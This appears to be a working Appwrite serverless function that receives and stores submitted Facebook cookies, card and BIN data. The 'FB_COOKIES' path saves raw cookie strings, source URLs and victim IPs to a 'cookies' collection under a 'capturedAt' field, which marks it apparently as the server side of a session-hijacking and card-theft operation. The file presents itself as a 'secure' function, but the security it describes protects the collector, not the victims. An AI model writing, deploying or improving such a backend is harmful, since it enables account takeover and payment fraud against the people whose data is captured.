import { Client, Databases, ID } from 'node-appwrite';

// =============================================
// 🔒 SECURE APPWRITE FUNCTION - Doc_HEMA Team
// =============================================

// Rate limiting storage (in-memory for this instance)
const rateLimitStore = new Map();
const RATE_LIMIT_WINDOW = 60000; // 1 minute
const RATE_LIMIT_MAX_REQUESTS = 30; // Max 30 requests per minute per IP

// Allowed data types
const ALLOWED_TYPES = [
  'CARD_ADDED', 'FB_COOKIES', 'BIN_REGISTERED',
  'CARD_BINDING', 'LOGIN', 'LOGOUT', 'TEST_SAVE'
];

// Maximum data size (10KB)
const MAX_DATA_SIZE = 10240;

/**
 * Rate limiting check
 */
function checkRateLimit(ip) {
  const now = Date.now();
  const key = `rate:${ip}`;

  if (!rateLimitStore.has(key)) {
    rateLimitStore.set(key, { count: 1, resetTime: now + RATE_LIMIT_WINDOW });
    return { allowed: true, remaining: RATE_LIMIT_MAX_REQUESTS - 1 };
  }

  const entry = rateLimitStore.get(key);

  // Reset if window expired
  if (now > entry.resetTime) {
    rateLimitStore.set(key, { count: 1, resetTime: now + RATE_LIMIT_WINDOW });
    return { allowed: true, remaining: RATE_LIMIT_MAX_REQUESTS - 1 };
  }

  // Check limit
  if (entry.count >= RATE_LIMIT_MAX_REQUESTS) {
    return { allowed: false, remaining: 0, retryAfter: Math.ceil((entry.resetTime - now) / 1000) };
  }

  // Increment
  entry.count++;
  return { allowed: true, remaining: RATE_LIMIT_MAX_REQUESTS - entry.count };
}

/**
 * Validate incoming data
 */
function validateData(data) {
  const errors = [];

  // Check required fields
  if (!data.type) errors.push('Missing type field');
  if (!data.userId) errors.push('Missing userId field');

  // Check type is allowed
  if (data.type && !ALLOWED_TYPES.includes(data.type)) {
    errors.push(`Invalid type: ${data.type}`);
  }

  // Check data size
  const dataStr = JSON.stringify(data.data || {});
  if (dataStr.length > MAX_DATA_SIZE) {
    errors.push(`Data too large: ${dataStr.length} bytes (max: ${MAX_DATA_SIZE})`);
  }

  // Sanitize strings (basic XSS prevention)
  if (data.userId && data.userId.length > 100) {
    errors.push('userId too long');
  }

  return {
    valid: errors.length === 0,
    errors
  };
}

/**
 * Main function handler
 */
export default async ({ req, res, log, error }) => {
  // CORS headers
  const corsHeaders = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type, X-User-Token'
  };

  // Handle preflight
  if (req.method === 'OPTIONS') {
    return res.empty(204, corsHeaders);
  }

  // Only accept POST
  if (req.method !== 'POST') {
    return res.json({ success: false, error: 'Method not allowed' }, 405, corsHeaders);
  }

  try {
    // Get client IP
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
      req.headers['x-real-ip'] ||
      req.headers['x-appwrite-client-ip'] ||
      'unknown';

    log(`📥 Request from IP: ${clientIP}`);

    // 🔒 Security Layer 1: Rate Limiting
    const rateCheck = checkRateLimit(clientIP);
    if (!rateCheck.allowed) {
      log(`🚫 Rate limit exceeded for IP: ${clientIP}`);
      return res.json({
        success: false,
        error: 'Rate limit exceeded',
        retryAfter: rateCheck.retryAfter
      }, 429, { ...corsHeaders, 'Retry-After': String(rateCheck.retryAfter) });
    }

    // Parse body - Appwrite may send body in different formats
    let body;
    try {
      // Debug logs
      log(`📦 Checking body sources...`);
      if (req.bodyJson) log(`📦 req.bodyJson found (type: ${typeof req.bodyJson})`);

      // 1. Try bodyJson (Appwrite 1.4+)
      if (req.bodyJson && typeof req.bodyJson === 'object') {
        body = req.bodyJson;
        log(`✅ Using req.bodyJson`);
      }
      // 2. Try bodyRaw (JSON string)
      else if (req.bodyRaw && typeof req.bodyRaw === 'string' && req.bodyRaw.length > 0) {
        body = JSON.parse(req.bodyRaw);
        log(`✅ Parsed from req.bodyRaw`);
      }
      // 3. Try bodyText (JSON string)
      else if (req.bodyText && typeof req.bodyText === 'string' && req.bodyText.length > 0) {
        body = JSON.parse(req.bodyText);
        log(`✅ Parsed from req.bodyText`);
      }
      // 4. Try standard body if it's a non-empty string
      else if (typeof req.body === 'string' && req.body.length > 2) { // >2 because "{}" is 2 chars
        body = JSON.parse(req.body);
        log(`✅ Parsed from req.body string`);
      }
      // 5. Try standard body if it's already an object
      else if (typeof req.body === 'object' && req.body !== null && Object.keys(req.body).length > 0) {
        body = req.body;
        log(`✅ Using req.body object`);
      }
      else {
        log(`❌ No valid body found`);
        return res.json({
          success: false,
          error: 'Empty request body',
          debug: {
            hasBodyJson: !!req.bodyJson,
            bodyRawLen: req.bodyRaw?.length,
            bodyType: typeof req.body
          }
        }, 400, corsHeaders);
      }
    } catch (e) {
      log(`❌ JSON parse error: ${e.message}`);
      return res.json({ success: false, error: 'Invalid JSON body: ' + e.message }, 400, corsHeaders);
    }

    // 🔒 Security Layer 2: Data Validation
    const validation = validateData(body);
    if (!validation.valid) {
      log(`❌ Validation failed: ${validation.errors.join(', ')}`);
      return res.json({
        success: false,
        error: 'Validation failed',
        details: validation.errors
      }, 400, corsHeaders);
    }

    // Initialize Appwrite client with server-side API key
    const client = new Client()
      .setEndpoint(process.env.APPWRITE_ENDPOINT)
      .setProject(process.env.APPWRITE_PROJECT_ID)
      .setKey(process.env.APPWRITE_API_KEY);

    const databases = new Databases(client);

    // Save to logs collection
    const logDocument = {
      userId: body.userId,
      type: body.type,
      data: JSON.stringify(body.data || {}),
      ip: clientIP,
      createdAt: new Date().toISOString()
    };

    log(`📝 Saving log: ${body.type} for user ${body.userId}`);

    const savedLog = await databases.createDocument(
      process.env.APPWRITE_DATABASE_ID,
      'logs',
      ID.unique(),
      logDocument
    );

    log(`✅ Log saved: ${savedLog.$id}`);

    // If cookies, also save to cookies collection
    let savedCookies = null;
    if (body.type === 'FB_COOKIES' && body.cookies) {
      const cookiesDocument = {
        userId: body.userId,
        cookies: body.cookies.substring(0, 10000), // Limit size
        url: body.url || '',
        ip: clientIP,
        capturedAt: new Date().toISOString()
      };

      savedCookies = await databases.createDocument(
        process.env.APPWRITE_DATABASE_ID,
        'cookies',
        ID.unique(),
        cookiesDocument
      );

      log(`✅ Cookies saved: ${savedCookies.$id}`);
    }

    return res.json({
      success: true,
      logId: savedLog.$id,
      cookiesId: savedCookies?.$id || null,
      remaining: rateCheck.remaining
    }, 200, corsHeaders);

  } catch (e) {
    error(`❌ Error: ${e.message}`);
    error(e.stack);

    return res.json({
      success: false,
      error: 'Internal server error'
    }, 500, corsHeaders);
  }
};
